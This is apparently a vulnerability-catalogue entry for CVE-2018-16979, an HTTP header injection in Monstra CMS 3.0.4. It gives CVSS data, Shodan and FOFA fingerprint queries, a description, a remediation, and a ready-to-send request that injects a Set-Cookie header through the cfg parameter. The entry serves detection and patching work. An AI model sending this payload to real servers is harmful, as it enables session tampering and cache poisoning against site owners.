---
layout: post
cve_id: CVE-2018-16979
title: Monstra CMS 3.0.4 - HTTP Header Injection
pcap: true
pcap_path: /pcaps/2018/CVE-2018-16979.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-16979.yaml
snort2_rule: N/A
snort3_rule: N/A
author: 0x_Akoko
severity: medium
impact: 'This vulnerability can lead to various attacks such as session hijacking,
  cross-site scripting (XSS), and remote code execution (RCE).

  '
remediation: 'Upgrade Monstra CMS to version 3.0.5 or later to mitigate the HTTP Header
  Injection vulnerability.

  '
reference:
- https://github.com/howchen/howchen/issues/4
- https://nvd.nist.gov/vuln/detail/CVE-2018-16979
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2018-16979
  cwe-id: CWE-113
  epss-score: 0.0833
  epss-percentile: 0.91998
  cpe: cpe:2.3:a:monstra:monstra:3.0.4:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: monstra
  product: monstra
  shodan-query: http.favicon.hash:419828698
  fofa-query: icon_hash=419828698
tags:
- cve2018
- cve
- crlf
- mostra
- mostracms
- cms
- monstra
- xss
- vuln
---

## üîç Vulnerability Description
Monstra CMS 3.0.4 is susceptible to HTTP header injection in the plugins/captcha/crypt/cryptographp.php cfg parameter. An attacker can potentially supply invalid input and cause the server to allow redirects to attacker-controlled domains, perform cache poisoning, and/or allow improper access to virtual hosts not intended for this purpose. This is a related issue to CVE-2012-2943.


## üåê HTTP Request
```nohighlight
GET /plugins/captcha/crypt/cryptographp.php?cfg=1%0D%0ASet-Cookie:%20crlfinjection=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.7.20) Gecko/ Firefox/3.6.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

